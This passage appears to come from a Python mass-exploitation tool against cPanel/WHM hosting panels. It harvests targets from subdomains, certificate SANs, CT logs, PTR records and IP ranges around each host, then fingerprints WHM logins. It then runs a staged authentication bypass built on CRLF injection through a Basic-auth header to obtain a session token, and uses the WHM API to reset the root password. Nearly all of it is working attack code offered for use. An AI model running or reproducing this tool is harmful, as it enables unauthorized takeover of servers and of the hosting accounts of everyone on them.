                    for nm in info.get("san_domains") or []:
                        ident = _normalize_cert_hostname(str(nm))
                        if ident:
                            acc.extend(
                                targets_all_services_for_host(ident, "cert_fanout")
                            )
                    subj = info.get("subject") or {}
                    cn = subj.get("commonName") or subj.get("CN")
                    if isinstance(cn, str):
                        ident = _normalize_cert_hostname(cn)
                        if ident:
                            acc.extend(
                                targets_all_services_for_host(
                                    ident, "cert_fanout_cn"
                                )
                            )
                except Exception:
                    pass
                return acc

        parts = await asyncio.gather(
            *(pull_one(h) for h in uniq), return_exceptions=True
        )
        merged: List[Target] = []
        for p in parts:
            if isinstance(p, list):
                merged.extend(p)
        log_discovery(f"Certificate fan-out examined {len(uniq)} seeds -> {len(merged)} rows")
        return merged

    async def discover_hosting_infrastructure(self, target: Target) -> List[Target]:
        """Hosting-provider hint patterns — full service port matrix like other branches."""
        discovered_targets: List[Target] = []

        provider = await self.network_intel.detect_hosting_provider(target)

        if provider:
            log_discovery(f"Detected hosting provider: {provider}")

            if provider in ("cloudflare",):
                base_domain = self.extract_base_domain(target.host)
                if not self.network_intel._is_ip_str(base_domain):
                    for pattern in (
                        "origin", "direct", "server", "edge", "cdn", "assets",
                    ):
                        hostname = f"{pattern}.{base_domain}"
                        discovered_targets.extend(
                            targets_all_services_for_host(
                                hostname, f"provider_{provider}"
                            )
                        )

            elif provider in ("amazon", "google"):
                ips = await self.network_intel.resolve_all_ips(target.host)
                for ip in ips:
                    try:
                        ip_obj = ipaddress.IPv4Address(ip)
                        for offset in (-2, -1, 1, 2, 3, -3):
                            adjacent_ip = str(ip_obj + offset)
                            discovered_targets.extend(
                                targets_all_services_for_host(
                                    adjacent_ip, f"provider_{provider}_adj"
                                )
                            )
                    except Exception:
                        pass

        return discovered_targets
    
    async def comprehensive_discovery(self, initial_target: Target) -> DiscoveryResult:
        """Orchestrate comprehensive discovery process"""
        log_discovery(f"Starting comprehensive discovery for {initial_target.host}")
        
        all_discovered = []
        resolved_ips = await self.network_intel.resolve_all_ips(initial_target.host)
        ssl_domains = []
        
        # Phase 1: Subdomain discovery
        if not self.network_intel._is_ip_str(initial_target.host):
            base_domain = self.extract_base_domain(initial_target.host)
            subdomain_targets = await self.discover_subdomains(base_domain)
            all_discovered.extend(subdomain_targets)
            log_discovery(f"Subdomain discovery found {len(subdomain_targets)} targets")
        
        # Phase 2: Certificate-based discovery
        cert_targets = await self.discover_from_certificate(initial_target)
        all_discovered.extend(cert_targets)
        if cert_targets:
            ssl_domains = [t.host for t in cert_targets]
            log_discovery(f"Certificate discovery found {len(cert_targets)} targets")
        
        # Phase 3: PTR that forward-match resolved IPs (panel names on neighbor hosts)
        if resolved_ips:
            ptr_targets = await self.discover_ptr_hostnames(resolved_ips)
            all_discovered.extend(ptr_targets)
            log_discovery(f"PTR-aligned hostnames -> {len(ptr_targets)} endpoints")

        # Phase 4: IP range (/24 stratified heavy sample)
        range_targets = await self.discover_ip_range(initial_target)
        all_discovered.extend(range_targets)
        log_discovery(f"IP-range scan generated {len(range_targets)} endpoints")

        # Phase 5: Certificate Transparency subdomain harvest (domains only)
        if not self.network_intel._is_ip_str(initial_target.host):
            bd = self.extract_base_domain(initial_target.host)
            ct_targets = await self.discover_ct_logs(bd)
            all_discovered.extend(ct_targets)
            log_discovery(f"crt.sh endpoints -> {len(ct_targets)}")

        # Phase 7: secondary TLS graph (SAN expansion from names collected above)
        seeds: List[str] = []
        sh: Set[str] = set()
        for t in all_discovered:
            h = (t.host or "").strip().lower()
            if not h or self.network_intel._is_ip_str(h):
                continue
            if h not in sh:
                sh.add(h)
                seeds.append(h)
        fan = await self.discover_certificate_fanout(seeds)
        all_discovered.extend(fan)

        # Phase 8: Hosting infrastructure discovery
        infra_targets = await self.discover_hosting_infrastructure(initial_target)
        all_discovered.extend(infra_targets)

        # Phase 9: Derive-from-derived recursive waves
        recursive_targets = await self.discover_recursive_derivations(
            initial_target.host, all_discovered
        )
        all_discovered.extend(recursive_targets)
        if recursive_targets:
            log_discovery(f"Recursive derivation generated {len(recursive_targets)} endpoints")

        hosting_provider = await self.network_intel.detect_hosting_provider(initial_target)
        
        result = DiscoveryResult(
            original_target=initial_target,
            discovered_targets=all_discovered,
            resolved_ips=resolved_ips,
            ssl_domains=ssl_domains,
            hosting_provider=hosting_provider
        )
        
        log_discovery(f"Total discovery results: {len(all_discovered)} targets, "
                     f"{len(resolved_ips)} IPs, provider: {hosting_provider}")
        
        return result

# ══════════════════════════════════════════════════════════
# Network Prober Class
# ══════════════════════════════════════════════════════════
class NetworkProber:
    @staticmethod
    async def tcp_probe(host: str, port: int) -> bool:
        """Fast TCP port connectivity check"""
        key = f"{host.lower()}:{port}"
        async with _tcp_lock:
            if key in _tcp_cache:
                return _tcp_cache[key]

        open_ = False
        try:
            conn = asyncio.open_connection(host, port)
            reader, writer = await asyncio.wait_for(conn, timeout=TCP_TIMEOUT)
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
            open_ = True
        except Exception:
            open_ = False

        async with _tcp_lock:
            _tcp_cache[key] = open_

        return open_
    
    @staticmethod
    async def batch_tcp_probe(targets: List[Target]) -> List[Target]:
        """Efficiently probe multiple targets and return only open ones"""
        open_targets = []
        
        probe_tasks = []
        for target in targets:
            if target.port:
                task = asyncio.create_task(
                    NetworkProber.tcp_probe(target.host, target.port)
                )
                probe_tasks.append((target, task))
        
        for target, task in probe_tasks:
            try:
                is_open = await task
                if is_open:
                    open_targets.append(target)
            except Exception:
                pass
        
        return open_targets

# ══════════════════════════════════════════════════════════
# Enhanced Target Processing
# ══════════════════════════════════════════════════════════
def normalize_target(raw_line: str) -> Optional[Target]:
    """Parse and normalize raw input into Target object"""
    line = raw_line.strip()
    if not line or line.startswith('#'):
        return None
    
    # Remove inline comments
    line = line.split('#')[0].strip()
    
    # Handle various input formats
    if not line.startswith(('http://', 'https://')):
        # Try to detect if it looks like a domain or IP
        if '://' not in line:
            line = f"https://{line}"
    
    try:
        parsed = urlparse(line)
        host = parsed.hostname
        port = parsed.port
        scheme = parsed.scheme or "https"
        path = parsed.path or ""
        
        if not host:
            return None
            
        return Target(
            scheme=scheme,
            host=host,
            port=port,
            path=path,
            source="input"
        )
    except Exception:
        return None

# ══════════════════════════════════════════════════════════
# IP / DNS utils (Enhanced)
# ══════════════════════════════════════════════════════════
def _is_ip_str(s: str) -> bool:
    s = s.strip("[]")
    try:
        socket.inet_pton(socket.AF_INET, s)
        return True
    except OSError:
        pass
    try:
        socket.inet_pton(socket.AF_INET6, s)
        return True
    except OSError:
        pass
    return False


def _normalize_cert_hostname(raw: str) -> Optional[str]:
    """Strip noise from SAN/CN fields before turning into discovery hostnames."""
    if not raw:
        return None
    s = str(raw).strip().lower().rstrip(".")
    if not s or s.startswith("*"):
        return None
    # "host:443" style
    if ":" in s and not s.startswith("["):
        left, _, right = s.rpartition(":")
        if right.isdigit():
            s = left
    if "/" in s:
        s = s.split("/", 1)[0].strip()
    if " " in s or "\n" in s:
        return None
    if len(s) > 253:
        return None
    if not _is_ip_str(s) and "." not in s:
        return None
    return s


def is_ip(s: str) -> bool:
    return _is_ip_str(s)

async def resolve_all_ips(host: str) -> list[str]:
    """Returns all IPs (A + AAAA) for domain"""
    clean = host.strip("[]")
    if _is_ip_str(clean):
        return [clean]

    async with _dns_lock:
        if clean in _dns_cache:
            return _dns_cache[clean]

    loop = asyncio.get_event_loop()
    ips: list[str] = []
    try:
        recs = await asyncio.wait_for(
            loop.run_in_executor(None, socket.getaddrinfo, clean, None),
            timeout=DNS_TIMEOUT
        )
        seen_ips: set[str] = set()
        for r in recs:
            ip = r[4][0]
            if _is_ip_str(ip) and ip not in seen_ips:
                seen_ips.add(ip)
                ips.append(ip)
    except Exception:
        pass

    async with _dns_lock:
        _dns_cache[clean] = ips

    return ips

async def resolve_dns(host: str) -> bool:
    ips = await resolve_all_ips(host)
    return bool(ips)

# ══════════════════════════════════════════════════════════
# TCP quick probe
# ══════════════════════════════════════════════════════════
async def tcp_probe(host: str, port: int) -> bool:
    key = f"{host.lower()}:{port}"
    async with _tcp_lock:
        if key in _tcp_cache:
            return _tcp_cache[key]

    open_ = False
    try:
        conn = asyncio.open_connection(host, port)
        reader, writer = await asyncio.wait_for(conn, timeout=TCP_TIMEOUT)
        writer.close()
        try: await writer.wait_closed()
        except Exception: pass
        open_ = True
    except Exception:
        open_ = False

    async with _tcp_lock:
        _tcp_cache[key] = open_

    return open_

# ══════════════════════════════════════════════════════════
# Input normalization
# ══════════════════════════════════════════════════════════
def _sanitize_raw_line(raw: str) -> str:
    """Fix IP:PORT:PORT and other malformed formats"""
    raw = raw.strip()
    if not raw:
        return raw

    has_scheme = raw.startswith(("http://", "https://"))

    if has_scheme:
        scheme_end = raw.index("://") + 3
        scheme = raw[:scheme_end]
        rest   = raw[scheme_end:]
        # IPv6 [::1]:port
        ipv6_m = re.match(r"^(\[[^\]]+\])(?::(\d+))?(?::.+)?(/.*)?$", rest)
        if ipv6_m:
            h    = ipv6_m.group(1)
            port = ipv6_m.group(2) or ""
            path = ipv6_m.group(3) or ""
            return scheme + h + (f":{port}" if port else "") + path
        # Regular: host:port:extra/path
        parts     = rest.split("/", 1)
        host_port = parts[0]
        path      = "/" + parts[1] if len(parts) > 1 else ""
        hp        = host_port.split(":")
        if len(hp) >= 3:
            # Check if ports are identical -> remove duplicate
            if hp[1] == hp[2]:
                return scheme + hp[0] + f":{hp[1]}" + path
            else:
                # Take first valid port
                return scheme + hp[0] + f":{hp[1]}" + path
        return raw
    else:
        # No protocol
        parts = raw.split(":")
        if len(parts) > 2:
            # Check IPv6
            if raw.startswith("["):
                return raw  # Leave as is
            return f"{parts[0]}:{parts[1]}"
        return raw

def _correct_scheme(scheme: str, port: int) -> str:
    """Correct protocol based on port"""
    return PORT_SCHEME_MAP.get(port, scheme)


def targets_all_services_for_host(host: str, source: str) -> List[Target]:
    """
    Primary WHM/cPanel/webmail/webdisk ports (DIRECT_PORTS) plus edge 443/80.
    Used for derived hosts (CT, SAN, PTR, /24, subdomains) so nothing obvious is skipped.
    """
    rows: List[Target] = []
    for p, sch, lbl in DIRECT_PORTS:
        rows.append(
            Target(
                scheme=_correct_scheme(sch, p),
                host=host,
                port=p,
                source=source,
            )
        )
    rows.append(Target(scheme="https", host=host, port=443, source=f"{source}_443"))
    rows.append(Target(scheme="http", host=host, port=80, source=f"{source}_80"))
    return rows


def parse_raw_input(raw: str) -> Optional[tuple[str, str, Optional[int]]]:
    """
    Returns (scheme, host, port|None)
    or None if invalid line.
    Full URLs with path/query are OK — host + port are taken (e.g. https://host:2087/foo).
    """
    raw = _sanitize_raw_line(raw.strip())
    if not raw:
        return None

    if not raw.startswith(("http://", "https://")):
        raw_try = "https://" + raw
        user_scheme = None
    else:
        raw_try     = raw
        user_scheme = "https" if raw.startswith("https://") else "http"

    try:
        p    = urlparse(raw_try)
        host = p.hostname or ""
        port = p.port
    except Exception:
        return None

    if not host:
        return None
    if not _is_ip_str(host) and "." not in host:
        return None

    # Correct scheme
    if port is not None:
        scheme = _correct_scheme(user_scheme or "https", port)
    else:
        scheme = user_scheme or "https"

    return scheme, host, port

# ══════════════════════════════════════════════════════════
# Base domain extraction
# ══════════════════════════════════════════════════════════
def extract_base_domain(host: str) -> str:
    if _is_ip_str(host): return host
    parts = host.lower().strip("[]").split(".")
    if len(parts) < 2: return host
    if len(parts) >= 3:
        two = f"{parts[-2]}.{parts[-1]}"
        if two in MULTI_TLDS:
            if len(parts) >= 4:
                return f"{parts[-3]}.{two}"
    return f"{parts[-2]}.{parts[-1]}"

# ══════════════════════════════════════════════════════════
# Enhanced Discovery Plan Builder
# ══════════════════════════════════════════════════════════
def build_discovery_plan(raw: str) -> list[Endpoint]:
    """
    Build multi-phase scanning plan:
    P0 = Port from input
    P1 = Default WHM (2087/2086) on same host  
    P2 = whm.domain on 443 and 2087
    P3 = Resolved IP on 2087/2086
    P4 = All other cPanel ports
    """
    parsed = parse_raw_input(raw)
    if not parsed:
        return []

    scheme, host, port = parsed
    plan: list[Endpoint] = []
    seen: set[str]       = set()

    def add(s: str, h: str, p: int, lbl: str, pri: int, src: str) -> None:
        # Correct scheme based on known port
        correct_s = _correct_scheme(s, p)
        ep  = Endpoint(correct_s, h, p, lbl, pri, src)
        key = ep.key
        if key not in seen:
            seen.add(key)
            plan.append(ep)

    # ── P0: Port from input ──────────────────────
    if port is not None:
        add(scheme, host, port, "CUSTOM-INPUT", 0, "input_port")
        # Try alternate protocol for unknown ports
        if port not in PORT_SCHEME_MAP:
            alt = "http" if scheme == "https" else "https"
            add(alt, host, port, "CUSTOM-INPUT-ALT", 0, "input_port_alt")

    # ── P1: Default WHM on same host ──────────────────
    for p, s, lbl in WHM_PORTS:
        add(s, host, p, f"P1-{lbl}", 1, "whm_default")

    # ── P2: subdomains ─────────────────────────────────────
    if not is_ip(host):
        base = extract_base_domain(host)
        first_label = host.lower().split(".")[0]
        if base and base != host.lower():
            # whm subdomain
            wh = f"whm.{base}"
            add("https", wh, 443,  "P2-WHM-SUB-443",  2, "subdomain")
            add("https", wh, 2087, "P2-WHM-SUB-2087", 2, "subdomain")
            # cpanel subdomain
            cp = f"cpanel.{base}"
            add("https", cp, 443,  "P2-CP-SUB-443",   2, "subdomain")
            add("https", cp, 2083, "P2-CP-SUB-2083",  2, "subdomain")

        # If host itself is service subdomain
        if first_label in SERVICE_SUBDOMAINS and len(host.split(".")) >= 3:
            add("https", host, 443,  "P2-SVC-443",  2, "subdomain_direct")
            if first_label == "whm":
                add("https", host, 2087, "P2-WHM-2087", 2, "subdomain_direct")
            elif first_label == "cpanel":
                add("https", host, 2083, "P2-CP-2083",  2, "subdomain_direct")

    # ── P3 & P4: IP fallback added dynamically later ──────
    # (added in process_target after resolve)

    return plan

def build_ip_endpoints(ip: str, priority: int = 3) -> list[Endpoint]:
    """Build endpoints on specific IP"""
    eps: list[Endpoint] = []
    seen: set[str]      = set()
    for p, s, lbl in DIRECT_PORTS:
        ep = Endpoint(s, ip, p, f"IP-{lbl}", priority, "ip_fallback")
        if ep.key not in seen:
            seen.add(ep.key)
            eps.append(ep)
    return eps


def targets_to_endpoints(targets: List[Target], priority: int, label_prefix: str) -> list[Endpoint]:
    """Turn discovered Target rows into concrete Endpoints (all panel ports if port omitted)."""
    out: list[Endpoint] = []
    seen: set[str] = set()
    for t in targets:
        if t.port is not None:
            sch = _correct_scheme(t.scheme or "https", t.port)
            ep = Endpoint(sch, t.host, t.port, f"{label_prefix}-{t.source}", priority, t.source)
            if ep.key not in seen:
                seen.add(ep.key)
                out.append(ep)
        else:
            for p, s, lbl in DIRECT_PORTS:
                sch = _correct_scheme(s, p)
                ep = Endpoint(sch, t.host, p, f"{label_prefix}-{lbl}", priority, t.source)
                if ep.key not in seen:
                    seen.add(ep.key)
                    out.append(ep)
    return out


def merge_endpoints_unique(*groups: list[Endpoint]) -> list[Endpoint]:
    seen: set[str] = set()
    merged: list[Endpoint] = []
    for group in groups:
        for ep in group:
            if ep.key in seen:
                continue
            seen.add(ep.key)
            merged.append(ep)
    return merged

# ══════════════════════════════════════════════════════════
# Target loading (Enhanced)
# ══════════════════════════════════════════════════════════
_HEADER_WORDS = {"host","url","domain","target","ip","address",
                 "hostname","website","site"}

def _looks_like_header(line: str) -> bool:
    low = line.lower().strip()
    if low in _HEADER_WORDS: return True
    if re.fullmatch(r'[a-z_\-]+', low) and '.' not in low: return True
    return False

def _dedup_key(raw: str) -> str:
    """Unified dedup key"""
    parsed = parse_raw_input(raw)
    if not parsed:
        return raw.lower().strip()
    scheme, host, port = parsed
    h = host.lower().lstrip("www.").strip("[]")
    if port is None:
        return f"{scheme}://{h}"
    return f"{scheme}://{h}:{port}"

def load_targets(path: str) -> list[str]:
    if not os.path.exists(path):
        log_fail(f"targets file not found: {path}")
        return []

    seen:   set[str]  = set()
    result: list[str] = []
    dup = hdr = blank = inv = 0

    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            for line_num, raw_line in enumerate(f, 1):
                try:
                    line = raw_line.split("#")[0].strip()
                    if not line:
                        blank += 1
                        continue
                    
                    if _looks_like_header(line):
                        hdr += 1
                        continue

                    line = _sanitize_raw_line(line)

                    parsed = parse_raw_input(line)
                    if not parsed:
                        inv += 1
                        continue

                    key = _dedup_key(line)
                    if key in seen:
                        dup += 1
                        continue
                    
                    seen.add(key)
                    result.append(line)
                    
                except Exception as e:
                    log_warn(f"Error processing line {line_num}: {e}")
                    inv += 1
                    continue

    except Exception as e:
        log_fail(f"cannot read '{path}': {e}")
        return []

    log_info(
        f"targets:{len(result)}  dup:{dup}  "
        f"headers:{hdr}  blank:{blank}  invalid:{inv}"
    )
    return result

# ══════════════════════════════════════════════════════════
# Score-based fingerprint (Enhanced)
# ══════════════════════════════════════════════════════════
async def fingerprint_endpoint(session: aiohttp.ClientSession,
                                ep: Endpoint) -> FingerprintResult:
    async with _fp_lock:
        if ep.key in _fingerprint_cache:
            return _fingerprint_cache[ep.key]

    result = FingerprintResult(endpoint=ep)

    # TCP probe first
    port_open = await tcp_probe(ep.host, ep.port)
    if not port_open:
        result.error = "tcp_closed"
        result.classify()
        async with _fp_lock:
            _fingerprint_cache[ep.key] = result
        return result

    for path in ("/login/", "/"):
        url = f"{ep.url_base}{path}"
        try:
            async with session.get(
                url, ssl=False, allow_redirects=True,
                timeout=aiohttp.ClientTimeout(total=TOTAL_TIMEOUT),
                headers={"User-Agent": rand_ua()}
            ) as r:
                result.status_code = r.status

                # Check headers
                srv = r.headers.get("Server", "")
                if "cpsrvd" in srv.lower():
                    result.score += FP_SCORES["cpsrvd"]
                    result.evidence.append(f"Server:{srv}")

                for hk, hv in r.headers.items():
                    hkl = hk.lower()
                    hvl = hv.lower()
                    if "whostmgrsession" in hvl or "whostmgrsession" in hkl:
                        result.score += FP_SCORES["whostmgrsession"]
                        result.evidence.append("Cookie:whostmgrsession")
                    if "cpanel" in hkl or "cpsess" in hkl:
                        result.score += 20
                        result.evidence.append(f"Header:{hk}")

                # Check redirect
                fu = str(r.url).lower()
                if "/cpsess" in fu:
                    result.score += FP_SCORES["/cpsess"]
                    result.evidence.append(f"Redirect:/cpsess")
                if "cpanel" in fu or "whm" in fu:
                    result.score += 15
                    result.evidence.append(f"RedirectURL:{fu[:60]}")

                # Check body
                try:
                    body = await r.text(errors="replace")
                    bl   = body[:4000]

                    for sig, pts in FP_SCORES.items():
                        if sig in bl:
                            result.score += pts
                            result.evidence.append(f"Body:{sig}")

                    for neg, pts in FP_NEGATIVES.items():
                        if neg in bl:
                            result.score += pts  # negative
                            result.evidence.append(f"Negative:{neg}")

                except Exception:
                    pass

        except (asyncio.TimeoutError,
                aiohttp.ClientConnectorError,
                aiohttp.ServerConnectionError):
            result.error = "connect_fail"
            break
        except Exception as e:
            result.error = str(e)[:60]
            break

        if result.score >= 50:
            break  # Don't need to try second path

    result.classify()

    # Record fingerprint
    fp_record = {
        "input":       ep.label,
        "endpoint":    ep.key,
        "source":      ep.source,
        "priority":    ep.priority,
        "status_code": result.status_code,
        "score":       result.score,
        "confidence":  result.confidence,
        "service":     result.service,
        "evidence":    result.evidence,
        "error":       result.error,
        "ts":          now_ts(),
    }
    await write_line_async(FINGERPRINTS_FILE, json.dumps(fp_record, ensure_ascii=False))

    # Record by type
    if result.confidence == "confirmed" and result.service == "WHM":
        await write_line_async(WHM_CONFIRMED_FILE,
            f"[{now_ts()}] {ep.key}  score:{result.score}  "
            f"evidence:{result.evidence[:3]}")
    elif result.confidence == "likely":
        await write_line_async(WHM_LIKELY_FILE,
            f"[{now_ts()}] {ep.key}  score:{result.score}")
    elif result.confidence == "confirmed" and "cPanel" in result.service:
        await write_line_async(CPANEL_CONF_FILE,
            f"[{now_ts()}] {ep.key}  score:{result.score}")
    elif result.confidence == "not_whm" and ep.source == "input_port":
        await write_line_async(NOT_WHM_FILE,
            f"[{now_ts()}] {ep.key}  score:{result.score}")
    elif result.status_code == 200 and result.score < 25:
        await write_line_async(OPEN_NOSIG_FILE,
            f"[{now_ts()}] {ep.key}  http200_no_signature")

    async with _fp_lock:
        _fingerprint_cache[ep.key] = result

    return result

def is_whm_fingerprint(fp: FingerprintResult) -> bool:
    return fp.confidence in ("confirmed", "likely") and fp.score >= 40

# ══════════════════════════════════════════════════════════
# cPanel endpoint check (uses fingerprint)
# ══════════════════════════════════════════════════════════
async def is_cpanel_endpoint(session, scheme, host, port, timeout) -> tuple[bool, str]:
    ep = Endpoint(scheme, host, port, "check", source="direct")
    fp = await fingerprint_endpoint(session, ep)
    if fp.error == "connect_fail":
        return False, "connect_fail"
    if is_whm_fingerprint(fp):
        return True, f"score:{fp.score} evidence:{fp.evidence[:2]}"
    return False, f"score:{fp.score} confidence:{fp.confidence}"

class RequestError(Exception):
    def __init__(self, kind, detail=""):
        self.kind   = kind
        self.detail = detail
        super().__init__(f"{kind}: {detail}")

async def whm_request(session, method, scheme, host, port, canonical,
                      path, timeout, headers=None, data=None):
    hdrs = {
        "Host":       f"{canonical}:{port}",
        "User-Agent": rand_ua(),
        "Connection": "close",
    }
    if headers: hdrs.update(headers)
    url = f"{scheme}://{host}:{port}{path}"
    to  = aiohttp.ClientTimeout(total=timeout)
    try:
        if method.upper() == "POST":
            return await session.post(url, headers=hdrs, data=data,
                                      ssl=False, allow_redirects=False, timeout=to)
        return await session.get(url, headers=hdrs,
                                 ssl=False, allow_redirects=False, timeout=to)
    except asyncio.TimeoutError:               raise RequestError("timeout",      url)
    except aiohttp.ClientConnectorError as e:  raise RequestError("connect_fail", str(e))
    except aiohttp.ServerConnectionError as e: raise RequestError("server_error", str(e))
    except aiohttp.ClientSSLError as e:        raise RequestError("ssl_error",    str(e))
    except Exception as e:                     raise RequestError("unknown",       str(e))

# ══════════════════════════════════════════════════════════
# Stage 0 — canonical hostname
# ══════════════════════════════════════════════════════════
async def discover_canonical(session, scheme, host, port, timeout) -> str:
    url = f"{scheme}://{host}:{port}/openid_connect/cpanelid"
    try:
        async with session.get(
            url, ssl=False, allow_redirects=False,
            timeout=aiohttp.ClientTimeout(total=timeout),
            headers={"User-Agent": rand_ua(), "Connection": "close"}
        ) as r:
            loc = r.headers.get("Location", "")
            m   = re.match(r"^https?://([^:/]+)", loc)
            if m: return m.group(1)
    except Exception:
        pass
    return host

# ══════════════════════════════════════════════════════════
# Stage 1 — pre-auth session
# ══════════════════════════════════════════════════════════
async def stage1_preauth(session, scheme, host, port, canonical, timeout):
    try:
        resp = await whm_request(
            session, "POST", scheme, host, port, canonical,
            "/login/?login_only=1", timeout,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={"user": "root", "pass": "wrong"}
        )
    except RequestError as e:
        return None, e.kind

    cookie_raw = ""
    for k, v in resp.raw_headers:
        if k.lower() == b"set-cookie" and b"whostmgrsession=" in v.lower():
            cookie_raw = v.decode(errors="replace"); break
    if not cookie_raw:
        jar = session.cookie_jar.filter_cookies(f"{scheme}://{host}:{port}")
        c   = jar.get("whostmgrsession")
        if c: cookie_raw = f"whostmgrsession={c.value}"

    m = re.search(r"whostmgrsession=([^;]+)", cookie_raw)
    if not m: return None, f"no_cookie HTTP{resp.status}"

    raw_val = urllib.parse.unquote(m.group(1))
    base    = raw_val.split(",", 1)[0] if "," in raw_val else raw_val
    return (base, "ok") if base else (None, "empty_base")

# ══════════════════════════════════════════════════════════
# Stage 2 — CRLF injection
# ══════════════════════════════════════════════════════════
async def stage2_inject(session, scheme, host, port, canonical,
                        session_base, timeout):
    ce = urllib.parse.quote(session_base)
    try:
        resp = await whm_request(
            session, "GET", scheme, host, port, canonical, "/", timeout,
            headers={"Authorization": f"Basic {PAYLOAD_B64}",
                     "Cookie": f"whostmgrsession={ce}"}
        )
    except RequestError as e:
        return None, e.kind

    loc = resp.headers.get("Location", "")
    m   = re.search(r"/cpsess\d{10}", loc)
    if not m:
        return None, f"no_cpsess HTTP{resp.status} loc={loc[:80]!r}"
    token = m.group(0)
    log_info(f"      HTTP {resp.status} — token: {token}")
    return token, "ok"

# ══════════════════════════════════════════════════════════
# Stage 3 — propagate
# ══════════════════════════════════════════════════════════
async def stage3_propagate(session, scheme, host, port, canonical,
                           session_base, timeout):
    ce = urllib.parse.quote(session_base)
    try:
        resp = await whm_request(
            session, "GET", scheme, host, port, canonical,
            "/scripts2/listaccts", timeout,
            headers={"Cookie": f"whostmgrsession={ce}"}
        )
    except RequestError as e:
        return False, e.kind

    try:    body = await resp.text(errors="replace")
    except: body = ""
    bl = body.lower()

    if resp.status == 401 and ("token denied" in bl or "whm login" in bl):
        log_info(f"      HTTP {resp.status} — gadget fired")
        return True, "token_denied_401"
    return False, f"gadget_miss HTTP{resp.status}"

# ══════════════════════════════════════════════════════════
# Stage 4 — verify
# ══════════════════════════════════════════════════════════
async def stage4_verify(session, scheme, host, port, canonical,
                        session_base, token, timeout):
    ce = urllib.parse.quote(session_base)
    try:
        resp = await whm_request(
            session, "GET", scheme, host, port, canonical,
            f"{token}/json-api/version", timeout,
            headers={"Cookie": f"whostmgrsession={ce}"}
        )
        try:    body = await resp.text(errors="replace")
        except: body = ""
        log_info(f"      /json-api/version -> HTTP {resp.status}  {body[:100]}")
        if resp.status == 200 and '"version"' in body:
            return True, "version_200"
        if resp.status in (500, 503) and "license" in body.lower():
            return True, f"license_gated_{resp.status}"
        return False, f"HTTP{resp.status}"
    except RequestError as e:
        return False, e.kind

# ══════════════════════════════════════════════════════════
# WHM API helpers
# ══════════════════════════════════════════════════════════
async def whm_api(session, scheme, host, port, canonical,
                  session_base, token, function: str,
                  params: dict, timeout: int) -> tuple[int, dict | None, str]:
    ce = urllib.parse.quote(session_base)
    qs = "api.version=1"
    for k, v in params.items():
        if v is None: continue
        qs += f"&{urllib.parse.quote(str(k))}={urllib.parse.quote(str(v))}"
    try:
        resp = await whm_request(
            session, "GET", scheme, host, port, canonical,
            f"{token}/json-api/{function}?{qs}", timeout,
            headers={"Cookie": f"whostmgrsession={ce}"}
        )
        raw = await resp.text(errors="replace")
        try:    return resp.status, json.loads(raw), raw[:300]
        except: return resp.status, None, raw[:300]
    except RequestError as e:
        return 0, None, str(e)

async def cpanel_uapi(session, scheme, host, port, canonical,
                      session_base, token, cpuser: str,
                      module: str, func: str,
                      params: dict, timeout: int) -> tuple[int, dict | None, str]:
    ce = urllib.parse.quote(session_base)
    qs = f"cpanel_jsonapi_user={urllib.parse.quote(cpuser)}&api.version=1"
    for k, v in params.items():
        if v is None: continue
        qs += f"&{urllib.parse.quote(str(k))}={urllib.parse.quote(str(v))}"
    path = f"{token}/execute/{module}/{func}?{qs}"
    try:
        resp = await whm_request(
            session, "GET", scheme, host, port, canonical, path, timeout,
            headers={"Cookie": f"whostmgrsession={ce}"}
        )
        raw = await resp.text(errors="replace")
        try:    return resp.status, json.loads(raw), raw[:400]
        except: return resp.status, None, raw[:400]
    except RequestError as e:
        return 0, None, str(e)

# ══════════════════════════════════════════════════════════
# Stage PASSWD — change root password
# ══════════════════════════════════════════════════════════
async def do_passwd(session, scheme, host, port, canonical,
                    session_base, token, timeout,
                    new_password: str, endpoint: str) -> tuple[bool, str]:
    sep = C_BLK + "─" * 55 + Clr
    print(f"\n  {sep}")
    log_step(f"[PASSWD] Changing root password on {endpoint}")
    print(f"  {sep}")

    if len(new_password) < 8:
        log_fail("[PASSWD] ✘ Password less than 8 characters — cancelled")
        return False, "password_too_short"

    st, j, raw = await whm_api(
        session, scheme, host, port, canonical,
        session_base, token, "passwd",
        {"user": "root", "password": new_password},
        timeout
    )
    log_info(f"[PASSWD] passwd -> HTTP {st}")

    if st == 0:
        log_fail(f"[PASSWD] ✘ Connection failed: {raw[:120]}")
        return False, f"connection_error: {raw[:80]}"
    if st != 200:
        log_fail(f"[PASSWD] ✘ Unexpected HTTP: {st}  raw={raw[:100]}")
        return False, f"unexpected_http_{st}"

    if j is not None:
        meta        = j.get("metadata") or {}
        meta_result = meta.get("result")
        meta_reason = meta.get("reason", "")
        meta_raw    = (meta.get("output") or {}).get("raw", "")

        if meta_result == 1:
            log_pass(f"[PASSWD] ✔ Root password changed successfully!")
            log_data(f"         reason : {meta_reason}")
            log_data(f"         output : {meta_raw}")
            return True, f"metadata.result=1 | {meta_reason}"

        if meta_result is not None and meta_result != 1:
            log_fail(f"[PASSWD] ✘ metadata.result={meta_result}  reason={meta_reason}")
            return False, f"metadata.result={meta_result}: {meta_reason}"

        results_list = j.get("result") or []
        if isinstance(results_list, list) and results_list:
            first  = results_list[0] if isinstance(results_list[0], dict) else {}
            status = first.get("status")
            msg    = first.get("statusmsg", "")
            if status == 1:
                log_pass(f"[PASSWD] ✔ Root password changed (legacy)!")
                log_data(f"         msg: {msg}")
                return True, f"result[0].status=1 | {msg}"
            if status is not None:
                log_fail(f"[PASSWD] ✘ result[0].status={status}  msg={msg}")
                return False, f"legacy_status_{status}: {msg}"

        flat_status = j.get("status")
        if flat_status == 1:
            log_pass("[PASSWD] ✔ Root password changed (flat)!")
            return True, "flat_status=1"
        if flat_status is not None:
            log_fail(f"[PASSWD] ✘ flat_status={flat_status}")
            return False, f"flat_status={flat_status}"

        err = j.get("error") or meta.get("reason") or ""
        if err:
            log_fail(f"[PASSWD] ✘ API error: {err}")
            return False, f"api_error: {err}"

    raw_lower = raw.lower()
    if any(kw in raw_lower for kw in (
        "password changed","passwd updated","has been changed",
        "successfully",'"result":1','"status":1',
    )):
        log_pass("[PASSWD] ✔ Root password changed (raw text match)")
        return True, "raw_success_match"

    if any(kw in raw_lower for kw in (
        "error","failed","denied","invalid","not allowed","forbidden"
    )):
        log_fail(f"[PASSWD] ✘ Failed — raw={raw[:150]}")
        return False, f"raw_error: {raw[:100]}"

